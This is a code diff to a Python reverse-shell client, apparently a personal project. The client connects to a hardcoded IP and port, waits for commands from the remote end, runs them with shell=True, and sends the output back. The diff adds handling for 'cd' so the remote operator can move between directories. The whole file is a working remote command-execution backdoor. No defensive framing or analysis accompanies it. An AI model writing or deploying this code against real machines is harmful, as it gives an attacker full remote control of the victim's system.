@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import time
 
 IP = '127.0.0.1'  # TODO: make my ip static!!
 PORT = 8778
@@ -8,10 +9,10 @@ PORT = 8778
 
 def main():
     main_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     main_socket.connect((IP, PORT))
     try:
         while True:
+            global cwd
             cwd = os.getcwd()
             main_socket.sendall((cwd + '>').encode())
             # wait for command:
@@ -19,8 +20,21 @@ def main():
             # execute command:
             split_command = command.split(" ")
             # Shell=true gives us additional shell privileges
-            output = subprocess.Popen(split_command, stdout=subprocess.PIPE, shell=True).communicate()[0]
-            main_socket.sendall(output)
+            if split_command[0] != 'cd':
+                print("Non-cd command")
+                print(cwd)
+                output = subprocess.Popen(split_command, stdout=subprocess.PIPE, cwd=cwd, shell=True).communicate()[0]
+                main_socket.sendall(output)
+            elif len(split_command) > 1 and split_command[0] == 'cd':
+                print("normal cd command")
+                # update the current working directory and update the global variable
+                os.chdir(split_command[1])
+                cwd = os.getcwd()
+                main_socket.sendall("don't_display".encode())
+                print(cwd)
+            elif split_command[0] == 'cd' and len(split_command) == 1:
+                print("cd command with now arguments")
+                main_socket.sendall((cwd + '\n').encode())
     except KeyboardInterrupt:
         main_socket.close()
 
